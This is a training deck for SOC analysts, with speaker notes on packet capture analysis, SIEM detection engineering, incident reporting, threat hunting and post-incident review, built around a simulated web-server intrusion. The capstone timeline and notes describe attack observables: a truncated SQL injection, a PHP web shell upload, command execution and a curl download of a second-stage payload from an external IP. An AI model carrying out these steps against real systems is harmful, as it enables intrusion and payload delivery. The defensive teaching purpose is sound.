- **Follow TCP Stream** reconstructs the full application-layer conversation from raw packets, revealing HTTP request/response bodies, credentials sent in cleartext, and file transfer contents.
- **Export Objects** extracts files transferred over HTTP, SMB, or FTP, enabling hash verification of transferred payloads.
- **Statistics → Conversations** shows total traffic volume between each host pair, identifying large outbound data transfers consistent with exfiltration.
:::

:::table
| Wireshark Feature | SOC Use Case | Example Finding |
|---|---|---|
| **Display Filter** | Isolate attacker traffic | `ip.src == 198.51.100.45` |
| **Follow TCP Stream** | Read HTTP body content | SQLi result set returned in response |
| **Export Objects** | Extract uploaded files | `shell.php` extracted from POST body |
| **Statistics → I/O Graph** | Visualize traffic volume spikes | Large transfer spike at 02:15 UTC |
| **Protocol Hierarchy** | Identify unusual protocols | DNS traffic 10× baseline = DNS tunneling |
:::

:::image src="images/28_wireshark_analysis.png" alt="Wireshark interface screenshot mockup: the top packet list pane shows a series of HTTP packets between 192.0.2.142 and 10.0.1.20 highlighted in various colors, red for POST requests, orange for 201 responses; the middle packet detail pane shows a selected POST packet with expanded layers: Ethernet, IP (src 192.0.2.142 → dst 10.0.1.20), TCP (sport 54210 → dport 80), HTTP (POST /uploads/shell.php, Content-Type: application/x-php); a display filter bar at the top reads 'ip.src == 192.0.2.142 && http.request.method == POST'; a 'Follow TCP Stream' popup window shows the reconstructed HTTP conversation with the PHP web shell source code visible in the request body, highlighted in blue; an annotation callout points to the code with 'Web shell source code extracted from PCAP'" caption="Wireshark Follow TCP Stream analysis: the reconstructed HTTP conversation from the PCAP reveals the exact PHP web shell code sent in the POST body. This PCAP evidence corroborates the web server access log entry and provides the actual malicious payload for hash analysis and threat intelligence lookup." width=full
:::

:::notes
Network packet captures provide the deepest possible visibility into what occurred at the network layer, they are the ground truth that corroborates and enriches the information visible in firewall logs and web server access logs. While firewall logs record connection metadata (source IP, destination IP, port, action), they do not record the contents of the traffic. A PCAP records every byte of every packet, enabling analysts to reconstruct the exact content of HTTP requests and responses, extract transferred files, and read cleartext credentials or command output from non-encrypted sessions.

The workflow for analyzing a PCAP related to the lab scenario begins with applying a display filter to isolate traffic from the attacker's IP address: `ip.src == 198.51.100.45` or `ip.addr == 198.51.100.45` to see traffic in both directions. This reduces the displayed packets from potentially millions to only those involving the attacker. The next step is to right-click on one of the HTTP packets and select "Follow TCP Stream", this reconstructs the complete client-server conversation by reassembling all the TCP segments of the session into the readable application-layer exchange. For the SQL injection request, this reveals the exact query returned in the response body, confirming whether data was actually exfiltrated or whether the injection produced an error. For the web shell upload, the Follow TCP Stream view shows the exact PHP code contained in the POST request body, which can be copied, hashed, and submitted to VirusTotal.

Wireshark's Export Objects feature (File → Export Objects → HTTP) automatically extracts all files transferred over HTTP from the PCAP, including uploaded files and downloaded payloads. This is particularly useful for extracting web shell files, downloaded malware stages, and exfiltrated documents for further analysis. Each extracted file can be hashed and compared against threat intelligence databases.

The Statistics menu provides higher-level analytical views. The I/O Graph shows network throughput over time, a sudden spike in outbound traffic to a single external destination at an unexpected time is a strong exfiltration indicator. The Conversations view shows cumulative traffic between each pair of hosts, ranked by volume, making large data transfers immediately visible as outliers. Protocol Hierarchy shows the percentage of total traffic accounted for by each protocol, if DNS traffic suddenly accounts for 30% of total bandwidth (instead of the typical 1-2%), this suggests DNS tunneling C2 activity (MITRE T1071.004), where the attacker encodes commands and data in DNS query/response payloads to bypass network inspection tools that do not inspect DNS content.

A practical limitation of full PCAP analysis is storage: a busy enterprise network can generate terabytes of packet data per day. Most organizations implement selective capture strategies, capturing full packets only for specific segments (DMZ, critical servers) and retaining metadata-only (NetFlow) for the remainder. NetFlow records provide source IP, destination IP, port, protocol, packet count, and byte count for each flow, enough to identify suspicious communication patterns without the storage overhead of full packet content.
:::

%%%
---
unit: Operations
code: DE
title: Detection Engineering & SIEM Tuning
---
:::callout style=soft
**Detection engineering** is the practice of systematically building, testing, and maintaining SIEM correlation rules that accurately detect attacker behavior while minimizing false positives. It is the discipline that transforms reactive alert handling into proactive, coverage-driven defense.
:::

:::steps
**Define the detection goal:** Select the ATT&CK technique to detect (e.g., T1505.003 Web Shell). Identify the data sources that would contain evidence of this technique.
**Write the detection logic:** Draft the SIEM query or correlation rule that identifies the specific event patterns associated with the technique. Use precise field conditions to minimize false positive surface area.
**Test against synthetic data:** Replay known-good and known-malicious test data to verify that the rule fires on malicious patterns and does not fire on benign ones.
**Measure false positive rate:** Run the rule against 30 days of historical data. If the rule fires on legitimate activity, refine the logic with additional exclusion filters.
**Document and deploy:** Record the rule's ATT&CK mapping, data source dependencies, severity rating, and response playbook. Deploy to production with monitoring for false positive rate drift.
**Maintain:** Re-evaluate rules when data sources change, when the environment changes, or when new attacker TTP variants are observed.
:::

:::image src="images/28_detection_engineering_lifecycle.png" alt="Circular diagram with six stages labeled clockwise: Stage 1 in blue 'Define, select ATT&CK technique, identify data sources'; Stage 2 in purple 'Write, draft SIEM query or correlation rule'; Stage 3 in yellow 'Test, synthetic red team data, verify fires and non-fires'; Stage 4 in orange 'Measure, 30-day false positive rate assessment'; Stage 5 in green 'Deploy, ATT&CK-tagged rule in production SIEM with response playbook'; Stage 6 in grey 'Maintain, re-evaluate on environment change or new TTP variant'; arrows connect each stage clockwise; in the center of the circle, an ATT&CK technique card is shown with T1505.003 and coverage metrics: 'True Positive Rate: 94%, False Positive Rate: 0.3%'; a sidebar shows the Sigma rule format YAML skeleton for the web shell detection" caption="Detection engineering lifecycle: a six-stage iterative process from ATT&CK technique selection through testing, calibration, and deployment. The center shows the quality metrics that define a well-tuned rule: high true positive rate and low false positive rate, both verified against historical data before production deployment." width=full
:::

:::notes
The SOC's effectiveness is ultimately limited by the quality of its detection rules. A SIEM with thousands of uncalibrated default rules that generate a constant flood of false positives is operationally equivalent to having no SIEM: analysts become desensitized, alert fatigue sets in, and genuine incidents are lost in the noise. Conversely, a SIEM with a small number of highly precise, well-tested detection rules for the techniques most likely to be used against the specific organization produces a manageable volume of high-confidence alerts that analysts can effectively triage.

Detection engineering bridges the gap between the theoretical knowledge of attack techniques (encoded in MITRE ATT&CK) and the operational reality of a SIEM's correlation rule library. The Sigma project, an open-source community initiative, provides a vendor-neutral detection rule format that allows SOC engineers to write a rule once and convert it to the query language of any SIEM platform. A Sigma rule for web shell detection (T1505.003) written in YAML can be automatically converted to Splunk SPL, Microsoft Sentinel KQL, Elasticsearch query DSL, or IBM QRadar AQL using the `sigmac` tool or the SigmaHQ rule converter.

The false positive rate is the most critical quality metric for any detection rule. A rule that fires on legitimate activity trains analysts to dismiss alerts and obscures genuine incidents. The standard industry practice before deploying any new rule to production is to run it against at least 30 days of historical production data and review every match manually: if any match corresponds to legitimate activity, the rule logic must be refined with additional exclusion filters (e.g., "exclude processes running from trusted software deployment paths" or "exclude source IPs on the internal IT asset inventory"). Only after demonstrating a false positive rate below an acceptable threshold, typically below 5%, and ideally below 1% for high-severity rules, should the rule be deployed to production.

The documentation requirements for deployed detection rules are often underestimated. Each rule should record: which ATT&CK technique it detects, which data sources it depends on, when it was last validated, what the expected false positive rate is, what Tier 1 triage steps the analyst should follow when it fires, and what escalation criteria should trigger Tier 2 involvement. This documentation enables new analysts to triage effectively without institutional knowledge, and enables the SOC to identify rules that have become stale when data sources change.

NIST SP 800-137 (Information Security Continuous Monitoring) frames detection engineering as an ongoing organizational capability rather than a one-time deployment: rules must be re-evaluated when the monitored environment changes (new systems, new software versions, new business processes), when new attacker techniques are observed, and on a regular schedule (at minimum quarterly) to ensure they remain accurate. Organizations that treat their SIEM rule library as a static artifact rather than a living document find that their detection coverage drifts significantly over time as the environment evolves.
:::

%%%
---
unit: Operations
code: RPT
title: Incident Report Writing
---
:::callout style=soft
Every confirmed incident must be documented in a formal **incident report**. This document is the authoritative record of what happened, how it was detected, what was done, and what the organization should change to prevent recurrence.
:::

:::table
| Report Section | Required Content | Example |
|---|---|---|
| **Executive Summary** | Non-technical 1-paragraph overview of impact and response | "On 2026-06-30, a threat actor compromised the DMZ web server via SQLi and web shell, gaining OS command execution. No lateral movement beyond the initial host was confirmed. The host was isolated within 2 hours of detection." |
| **Incident Timeline** | Chronological UTC-timestamped event sequence | Table of events from 02:11 (scan) to 04:30 (isolation confirmed) |
| **Attack Narrative** | Technical description of attacker actions mapped to ATT&CK | "Attacker executed T1046 reconnaissance, followed by T1505.003 web shell deployment..." |
| **Indicators of Compromise** | All IoCs: IPs, domains, hashes, file paths | `198.51.100.45`, `shell.php`, SHA-256: `a3f...` |
| **Containment Actions Taken** | Specific actions and timestamps | "02:48 UTC, firewall rule added blocking 198.51.100.45" |
| **Root Cause Analysis** | Why did this succeed? Which control failed? | "Web application lacked input validation; /uploads/ directory was writable and executable" |
| **Recommendations** | Specific, prioritized remediation actions | "1. Implement WAF with OWASP Core Rule Set. 2. Remove execute permissions from /uploads/." |
:::

:::image src="images/28_incident_report_structure.png" alt="Document layout mockup for 'Incident Report, Incident-2026-0001': the document header shows Severity: HIGH, Date: 2026-06-30, Analyst: J. Rivera, Status: Closed; seven numbered sections are listed with brief content previews: Section 1 Executive Summary (one paragraph text block); Section 2 Incident Timeline (a mini-table with five UTC-timestamped rows); Section 3 Attack Narrative with ATT&CK technique tags (T1046, T1505.003, T1059) visible as colored badges; Section 4 Indicators of Compromise as a structured list; Section 5 Containment Actions as a timestamped checklist with green checkmarks; Section 6 Root Cause Analysis as a two-column table comparing expected control vs. actual state; Section 7 Recommendations as a numbered priority list; a footer shows 'Document Classification: CONFIDENTIAL, Distribution: SOC, CISO, Legal'" caption="Incident report structure: seven required sections progress from non-technical executive summary through technical timeline and ATT&CK narrative to actionable recommendations. The root cause analysis and recommendations sections drive organizational improvement and are the sections most reviewed by executive leadership." width=full
:::

:::notes
The incident report is the final and most enduring artifact of any security incident. While the SIEM tickets, log queries, and analyst notes capture the investigation process, the incident report is the document that communicates findings to management, satisfies regulatory reporting requirements, provides evidence in legal proceedings, and drives organizational security improvement through its root cause analysis and recommendations. A technically brilliant investigation that produces a poorly structured report fails to deliver organizational value, the findings must be communicated clearly to audiences ranging from the CISO to legal counsel to IT infrastructure teams.

The executive summary is written last but read first. It must be comprehensible to a non-technical reader, a C-level executive or board member who will read the first paragraph and immediately understand whether this incident is a severe breach requiring public disclosure or a contained intrusion with no data loss. Business impact must be stated clearly: which systems were affected, whether customer data was accessed or exfiltrated, how long the incident lasted, and the key containment actions taken. Avoid technical acronyms in the executive summary; write "the attacker uploaded a malicious script that allowed them to run commands on the server" rather than "T1505.003 web shell deployment via unrestricted file upload enabling OS command execution via T1059."

The incident timeline is the backbone of the technical sections. Every event must include an exact UTC timestamp, the log source it came from, the specific data element that identified it (Event ID, log line, alert name), and a brief description of what it means in context. The timeline enables readers to understand the attack progression and to verify that the analyst's interpretation is consistent with the raw evidence.

The root cause analysis (RCA) is the section that drives security improvement. Rather than describing what the attacker did, the RCA focuses on which security control failed or was absent that allowed each attack step to succeed. For the lab scenario: the web application lacked input validation (OWASP A03 violation) enabling SQLi; the /uploads/ directory had execute permissions (configuration error) enabling web shell execution; process creation auditing with command-line logging was not enabled (audit policy gap) delaying EDR detection. Each identified control failure maps to a specific recommendation in Section 7.

ISO/IEC 27035 Part 2 (Guidelines to Plan and Prepare for Incident Response) specifies that incident documentation must be retained for a period consistent with regulatory requirements and the organization's legal hold policies, typically a minimum of three years for most privacy regulations and seven years for financial sector compliance (PCI DSS, SOX). Documents must be stored in a write-protected location with access restricted to authorized personnel and access logged, consistent with the evidence integrity requirements of RFC 3227.
:::

%%%
---
unit: Comparison
code: CMP
title: Comparison, IDS vs. IPS vs. SIEM vs. SOAR
---
:::callout style=soft
These four defensive technologies are often confused. Each serves a distinct function in the detection and response workflow, they are complementary, not interchangeable.
:::

:::table
| Technology | Primary Function | Data Analyzed | Response Capability | Placement |
|---|---|---|---|---|
| **IDS** (Intrusion Detection System) | Detect malicious network patterns | Network packets | Alert only, no blocking | Network tap (out-of-band) |
| **IPS** (Intrusion Prevention System) | Detect AND block malicious traffic inline | Network packets | Drops malicious packets | Inline (in traffic path) |
| **SIEM** | Correlate logs from many sources; alert on patterns | Logs from all systems | Alerts and dashboards; no direct action | Centralized log aggregation |
| **SOAR** | Automate incident response workflows | SIEM alerts + threat intel | Executes playbook actions automatically | Orchestration layer above SIEM |
:::

:::callout style=soft
**Key distinction:** An IDS/IPS operates at the network packet level in real time. A SIEM operates on log data after events have occurred. A SOAR orchestrates automated responses using SIEM alerts as triggers, for example, automatically disabling an Active Directory account when a SIEM rule fires a credential theft alert.
:::

:::image src="images/28_ids_ips_siem_soar_comparison.png" alt="Layered architecture diagram showing four horizontal layers in the enterprise security stack: bottom layer labeled 'Network Traffic' with packet icons flowing through; second layer labeled 'IDS (out-of-band tap), copies packets, generates alerts, no blocking' and 'IPS (inline), inspects packets, drops malicious, passes clean'; third layer labeled 'SIEM, receives logs from IDS, IPS, Windows, Linux, web servers; correlates and alerts'; top layer labeled 'SOAR, receives SIEM alerts; executes automated playbook actions: disable account, block IP, create ticket, notify analyst'; vertical arrows show the data flow upward through each layer; a time axis on the right shows 'Milliseconds' at the bottom (IDS/IPS), 'Seconds to Minutes' in the middle (SIEM), and 'Minutes to Hours (automated)' at the top (SOAR)" caption="Security technology stack from packets to automated response: IDS/IPS operate on raw network traffic in near-real-time; SIEM aggregates and correlates log data from all sources; SOAR automates the response playbook actions that analysts would otherwise execute manually, reducing MTTR by enabling machine-speed response to common incident patterns." width=full
:::

:::notes
The confusion between IDS, IPS, SIEM, and SOAR is extremely common among students and even among junior practitioners, partly because marketing materials from security vendors often blur the distinctions between these categories. Each technology operates on different data, at different speeds, and with different response capabilities, and understanding these distinctions is essential for both making architecture decisions and for correctly describing security controls in incident reports and compliance documentation.

An Intrusion Detection System (IDS) is a passive monitoring technology. It receives a copy of network traffic, either via a network tap or a switch SPAN (Switched Port ANalyzer) port, and analyzes each packet against a database of known attack signatures. When a packet or packet sequence matches a signature (e.g., a string matching the pattern of a SQL injection in an HTTP payload), the IDS generates an alert but does not take any action on the traffic itself. Because the IDS receives a copy rather than the original traffic, it cannot block anything. The Snort and Suricata IDS engines are the most widely deployed open-source IDS implementations.

An Intrusion Prevention System (IPS) is an inline active blocking technology. It is placed directly in the traffic path, packets must pass through the IPS before reaching their destination. When the IPS identifies a malicious packet, it can drop it (preventing delivery to the target) in addition to generating an alert. The inline placement introduces latency into network paths and requires high availability design to prevent network outages if the IPS fails. Many modern next-generation firewalls include integrated IPS functionality, eliminating the need for a separate IPS appliance.

A SIEM does not operate on raw network traffic at all, it operates on log data, which is event metadata generated by systems after network events have already occurred. A SIEM cannot block traffic or stop an attack in progress; it can only generate alerts based on patterns observed in logs. The SIEM's value is in correlation across many different log sources simultaneously and in providing a searchable historical record for forensic investigation.

SOAR (Security Orchestration, Automation and Response) platforms sit above the SIEM in the operational stack and address the problem that even accurate SIEM alerts require human analyst action to implement the containment steps. A SOAR platform receives SIEM alerts as triggers and executes pre-defined playbooks automatically: for example, when a SIEM rule fires a "credential brute force - account locked" alert, the SOAR playbook might automatically query Active Directory to confirm the account lockout, look up the source IP in threat intelligence feeds, send a Slack notification to the Tier 1 analyst queue, and create a ticketing system incident record, all within seconds of the SIEM alert, before a human analyst has even opened the SIEM console. SOAR reduces MTTR by automating the repeatable, time-consuming triage steps that consume analyst time on common alert types.
:::

%%%
---
unit: Operations
code: HUNT
title: Threat Hunting Fundamentals
---
:::callout style=soft
**Threat hunting** is the proactive, human-led search for attacker activity that evades automated detection rules. Unlike reactive alert triage, hunting starts with a hypothesis about attacker behavior and queries historical data to prove or disprove it.
:::

:::steps
**Form a Hypothesis:** Based on ATT&CK TTPs relevant to your industry, formulate a specific testable hypothesis. Example: "An attacker using Pass-the-Hash would generate Type 3 network logons from workstations that do not normally initiate network logons."
**Define the Data Sources:** Identify which log sources contain the evidence needed to test the hypothesis. For this example: Windows Event ID 4624 with LogonType=3, filtered to workstation source addresses.
**Query and Analyze:** Execute SIEM queries to retrieve candidate events matching the hypothesis. Cluster results by source host and examine outliers.
**Investigate Outliers:** For each candidate finding, pull additional context, what else did this host do before and after the suspicious logon? Is there corresponding process creation activity?
**Document and Tune:** Record findings regardless of outcome. If no malicious activity is found, the hunt increases confidence that the technique is not present. If malicious activity is found, trigger the incident response process.
:::

:::image src="images/28_threat_hunting_workflow.png" alt="Five-step circular workflow diagram with a hunter icon at the center: Step 1 labeled 'Hypothesis, ATT&CK T1550.002 Pass-the-Hash in use?' with a lightbulb icon; Step 2 labeled 'Data, Windows Event 4624 LogonType=3 from workstation IPs' with a database icon; Step 3 labeled 'Query, SPL: index=wineventlog EventCode=4624 Logon_Type=3 src_category=workstation' with a magnifying glass icon; Step 4 labeled 'Analyze, cluster by source host, flag outliers with >2 unique destinations' with a chart icon; Step 5 labeled 'Act, if malicious: incident response; if clean: tune rules + document' with a checkmark/alert fork icon; arrows between steps are labeled with iteration notes: 'Hypothesis may be refined based on query results'; a box outside the circle reads 'Key difference from alert triage: hunting starts with human intuition, not a system alert'" caption="Threat hunting workflow: unlike reactive triage that starts with a SIEM alert, hunting starts with a human hypothesis derived from ATT&CK knowledge, queries proactively into historical data, and either uncovers hidden threats or generates confidence in the absence of a specific technique." width=full
:::

:::notes
Threat hunting addresses a fundamental limitation of correlation rule-based detection: rules can only detect what they were written to detect. An attacker using a novel technique, a customized tool variant, or a timing pattern that avoids the rule's time window can operate indefinitely without generating a SIEM alert. Threat hunters, typically Tier 3 analysts or dedicated detection engineers, work proactively to find this gap, using their knowledge of attacker tradecraft to formulate hypotheses about what malicious activity might look like in the specific data available.

The Pyramid of Pain, developed by David Bianco, is a useful framework for understanding which threat intelligence to prioritize in hunt activities. At the base of the pyramid are hash values, the easiest IoC to detect but also the easiest for attackers to change by recompiling malware. Above that are IP addresses, then domain names, then network artifacts (like User-Agent strings or protocol behavior patterns), then host artifacts (file names, registry keys), then TTPs at the top. TTPs are at the apex because they are the hardest for attackers to change, an attacker can trivially generate a new file hash by modifying a single byte of their malware, but they cannot easily abandon the fundamental technique of using PowerShell for post-exploitation because their tooling is built around it. Hunt activities targeting TTPs rather than specific IoCs are therefore more durable and more likely to detect sophisticated, adaptive attackers.

A worked example of a TTP-based hunt: hypothesis, the attacker may be using WMI (Windows Management Instrumentation) for lateral movement (MITRE T1047), because it is a legitimate Windows administrative protocol that many security products do not adequately monitor. The query: retrieve all process creation events (Event ID 4688) where the parent process is `WmiPrvSE.exe` (the WMI provider host), filtering for any child processes that are not standard WMI management tools. In a normal enterprise environment, very few processes should be legitimately spawned by the WMI provider host. Any result that shows `cmd.exe`, `powershell.exe`, or a custom executable spawned from `WmiPrvSE.exe` warrants immediate investigation as a probable WMI-based lateral movement or persistence mechanism.

NIST SP 800-61r2 and the SANS Incident Response framework both recognize proactive threat hunting as a component of mature incident response programs. The MITRE Cyber Analytics Repository (CAR) provides a curated library of detection analytics for ATT&CK techniques, with pseudocode implementations that can be adapted to any SIEM platform, making it an excellent starting resource for analysts building their first hunt analytics.

A threat hunt begins with a written hypothesis and the query that would test it, which is the discipline that separates hunting from undirected log browsing.
:::

%%%
---
unit: Operations
code: POST
title: Post-Incident Activity & Lessons Learned
---
:::callout style=soft
The fourth phase of the NIST SP 800-61r2 incident response lifecycle, **Post-Incident Activity**, is the most frequently skipped, yet it is where the greatest long-term security value is created. Every incident is a paid penetration test that reveals real weaknesses.
:::

:::steps
**Conduct a Post-Incident Review (PIR):** Within 72 hours of incident closure, convene the SOC team, affected system owners, and relevant stakeholders to review the incident timeline, response actions, and outcomes.
**Identify Lessons Learned:** For each phase of the response, answer: What went well? What took longer than expected? What information was missing that would have accelerated the response?
**Update Runbooks:** Revise Tier 1 and Tier 2 triage runbooks to reflect new IoC patterns, new escalation criteria, or new containment steps learned from this incident.
**Tune Detection Rules:** Add new SIEM correlation rules for techniques observed in this incident that did not have existing rules. Adjust existing rules if false positives or missed detections occurred.
**Apply Remediations:** Implement the specific technical remediations identified in the incident report: patch the exploited vulnerability, rotate exposed credentials, implement missing controls.
**Report to Leadership:** Present a summary of incident impact, response timeline, root causes, and planned remediations to CISO and relevant executives for risk governance tracking.
:::

:::image src="images/28_post_incident_review.png" alt="Meeting room illustration with six stakeholders seated around a table, each with a role badge: SOC Lead, Tier 2 Analyst, IT Operations, Legal, CISO, and Compliance Officer; a presentation screen at the front shows the incident timeline in condensed form with three highlighted sections labeled 'Gap 1: Log collection delay', 'Gap 2: No playbook for web shell containment', 'Gap 3: Vulnerability known for 90 days, patch not applied'; below the timeline, three action item columns labeled 'Detection Improvement', 'Process Improvement', and 'Technical Remediation' each contain bulleted items; a clock in the corner shows '48 hours post-incident'; a document icon labels 'Lessons Learned Report, v1.0'" caption="Post-incident review meeting: all stakeholders from SOC analysts to legal and the CISO review the incident timeline together, identifying three specific gaps in detection, process, and remediation that drove the incident's impact. Each gap produces a tracked action item for the responsible team." width=full
:::

:::notes
The post-incident review is the organizational learning mechanism that transforms security incidents from pure losses into investments in future resilience. Organizations that conduct thorough post-incident reviews after every significant incident systematically improve their detection, response, and prevention capabilities over time, closing the control gaps that attackers exploited and building institutional knowledge that accelerates future investigations. Organizations that skip post-incident reviews repeat the same mistakes across successive incidents.

NIST SP 800-61r2 Section 3.4 describes the post-incident activity phase and recommends that organizations hold a "lessons learned" meeting within 72 hours of incident closure, while the details are still fresh in participants' memories. The meeting should include every team involved in the response, SOC analysts, IT operations, system owners, legal counsel, and executive representation, to ensure that the lessons are captured from all perspectives and that action items are assigned to the teams with the authority and resources to implement them.

The three questions that structure the lessons learned discussion are: What worked well? What could have been done better? What should we do differently next time? For this incident, the analysis might find that the SIEM correlation rule for web shell detection fired correctly (what worked well), but that the Tier 1 runbook did not include a step for correlating the web server alert with EDR process data, causing a 45-minute delay in confirming the web shell execution (what could have been done better), and that the /uploads/ directory vulnerability had been flagged in a penetration test 90 days earlier but the patch had not been applied (what to do differently, a remediation tracking process with escalation procedures for overdue patches).

Each finding from the post-incident review should produce a specific, trackable action item assigned to a responsible owner with a completion deadline. Generic findings like "improve our security" are not actionable, every action item must name a specific deliverable: "Update the Tier 1 web shell runbook to include EDR correlation step by [date], Owner: SOC Lead," or "Apply execute permission removal to all /uploads/ directories across the web farm by [date], Owner: IT Operations."

ISO/IEC 27035 Part 2 provides a complementary framework for post-incident learning, particularly relevant for organizations pursuing ISO 27001 certification where evidence of continual improvement in the information security management system is required. The standard specifies that incident reports and lessons learned documents must be retained in a controlled document management system, and that improvement actions must be tracked to completion and verified effective.

The metrics that should be tracked across successive incidents over time include: MTTD trend (is detection getting faster?), MTTR trend (is containment getting faster?), recurring root causes (are the same control gaps being exploited repeatedly?), and detection coverage (what percentage of ATT&CK techniques now have validated SIEM rules?). These metrics provide the evidence base for security investment decisions and demonstrate the operational value of the SOC to executive leadership.
:::

%%%
---
unit: Checkpoint
code: CHK2
title: Lab Scenario Capstone, Putting It All Together
---
:::callout style=soft
Before the lab assessment, review the complete attack sequence from today's scenario, mapped end-to-end from initial reconnaissance to evidence preservation.
:::

:::table
| Time (UTC) | Log Source | Observable | ATT&CK Technique | Analyst Action |
|---|---|---|---|---|
| 02:11:03 | Firewall | 45 SYN packets to different ports from 198.51.100.45 | T1046 Network Service Discovery | Flag source IP, cross-reference other sources |
| 02:13:47 | Windows AD | 47× Event 4625 (TargetUser=jsmith, Sub_Status=0xC000006A) | T1110.001 Brute Force | Classify as brute-force, verify lockout Event 4740 |
| 02:14:05 | Nginx | GET /product.php?id=5 UNION SELECT... — 200 OK, 4502 bytes | T1190 Exploit Public-Facing App | Extract SQLi payload, confirm data returned |
| 02:15:10 | Nginx | POST /uploads/shell.php, 201 Created, curl UA | T1505.003 Web Shell | Classify as persistence, escalate to Tier 2 immediately |
| 02:16:04 | EDR | w3wp.exe → cmd.exe → whoami | T1059.003 Command Shell | Confirm web shell execution, initiate containment |
| 02:17:00 | EDR | curl → 203.0.113.50:443 stage2 download | T1105 Ingress Tool Transfer | Block C2 IP at firewall, isolate host to quarantine VLAN |
| 02:48:00 | SIEM | Firewall rule added, host isolated, account jsmith disabled | Containment Complete | Validate, confirm no further malicious traffic |
:::

:::image src="images/28_capstone_attack_summary.png" alt="End-to-end kill chain visualization with seven numbered stages in a horizontal left-to-right flow: Stage 1 red diamond 'Recon: Nmap scan 02:11'; Stage 2 red circle 'Brute Force: 47x Event 4625 02:13'; Stage 3 red square 'SQLi: UNION SELECT 200 OK 02:14'; Stage 4 red star 'Web Shell: POST shell.php 201 02:15'; Stage 5 red triangle 'Execution: w3wp→cmd 02:16'; Stage 6 dark red diamond 'C2: curl→203.0.113.50 02:17'; Stage 7 green shield 'Containment: isolated 02:48'; below each stage, log source icons indicate which telemetry source provided the evidence; above each stage, ATT&CK technique ID badges are shown; a total elapsed time label reads '37 minutes, Initial access to containment'; MTTR label at the bottom spans from Stage 4 to Stage 7" caption="Lab scenario capstone: the complete 7-stage attack chain from network scan to containment, with every stage mapped to the telemetry source that revealed it and the ATT&CK technique it represents. The 37-minute elapsed time from web shell upload (02:15) to host isolation (02:48) is the MTTR for this incident." width=full
:::

:::notes
This capstone slide synthesizes the entire day's content into a single consolidated view of the attack scenario we have been analyzing across every preceding slide. It serves as both a review of the full investigation and a structured guide for the lab assessment tasks that follow.

Let's walk through the complete timeline one final time, paying attention to what each log source contributed and why no single source alone would have been sufficient. The firewall logged the initial port scan at 02:11, without this, we would have had no warning that an attacker was mapping our network surface. The Windows Active Directory logs captured the brute-force authentication attempts at 02:13, without this, we would not have known that the attacker succeeded in identifying valid account credentials. The Nginx access log captured the SQL injection and web shell upload at 02:14 and 02:15, the two most critical evidence points for understanding what the attacker exploited and what persistence mechanism they established. The EDR agent captured the web shell command execution and C2 download at 02:16 and 02:17, confirming that the attacker had transitioned from exploitation to active post-exploitation and had downloaded a second-stage payload.

The containment timeline, host isolated and account disabled at 02:48, represents a 37-minute MTTR from the initial exploitation event (02:11 scan) and a 33-minute MTTR from the confirmed web shell upload (02:15). IBM's 2024 Cost of a Data Breach Report shows the global average MTTR is significantly longer than this, which means this simulated response represents a well-executed, timely containment. In the real world, achieving this speed requires pre-approved containment playbooks, pre-staged firewall rule templates, and SOAR automation to accelerate the manual steps.

The three lab assessment tasks that follow this lecture are designed to exercise each layer of this kill chain. Task 1 gives you raw authentication log files and asks you to classify the attack type and identify the attacker's source IP and target account. Task 2 gives you Nginx access log entries and asks you to identify each attack technique, classify the HTTP status codes, and determine whether each attack succeeded or was blocked. Task 3 asks you to build a forensic timeline from four log files, map each event to an ATT&CK technique, and write a two-paragraph containment recommendation citing the specific NIST SP 800-61r2 containment strategy criteria that apply.

Approach each task systematically using the analytical process we practiced today: normalize timestamps to UTC first, extract IoCs before drawing conclusions, cross-reference evidence across log sources before confirming findings, and map every finding to an ATT&CK technique before writing the report. These habits, applied consistently, are what distinguish effective SOC analysts from those who jump to conclusions on insufficient evidence. Good luck.

A containment recommendation must name its business-continuity consideration explicitly: isolating an affected system has a service-availability impact, and NIST SP 800-61r2 Section 3.3 criteria weigh that impact when choosing a containment strategy. Recommending isolation without addressing availability is incomplete.
:::
